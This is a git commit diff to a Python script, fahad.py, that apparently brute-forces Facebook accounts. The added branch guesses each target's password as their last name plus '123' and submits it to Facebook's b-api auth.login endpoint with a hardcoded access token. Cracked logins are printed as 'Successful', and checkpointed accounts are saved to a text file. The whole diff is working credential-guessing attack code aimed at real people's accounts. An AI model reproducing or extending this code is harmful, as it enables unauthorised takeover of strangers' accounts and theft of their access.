ced8e9c55f71869fef4f58e12eff529135dc63e8
fahadkhan9136 <63981187+fahadkhan9136@users.noreply.github.com>
2020-05-19 21:03:59 +0500

    Update fahad.py

--- fahad.py
+++ fahad.py
@@ -423,6 +423,20 @@ def pilih_super():
 											                                                                                                cek.write(user+"|"+pass10+"\n")
 											                                                                                                cek.close()
 											                                                                                                cekpoint.append(user+pass10)
+                                                                                                                                                                                else:
+									                                                                                                                pass11 = b['last_name'] + '123'
+									                                                                                                                data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass11)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									                                                                                                                q = json.load(data)
+									                                                                                                                if 'access_token' in q:
+										                                                                                                                print '\x1b[1;96m[\x1b[1;92mSuccessful\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
+										                                                                                                                oks.append(user+pass11)
+									                                                                                                                else:
+										                                                                                                                if 'www.facebook.com' in q["error_msg"]:
+											                                                                                                                print '\x1b[1;96m[\x1b[1;93mCheckpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass11
+											                                                                                                                cek = open("out/checkpoint.txt", "a")
+											                                                                                                                cek.write(user+"|"+pass11+"\n")
+											                                                                                                                cek.close()
+											                                                                                                                cekpoint.append(user+pass11)
 	
 		except:
 			pass
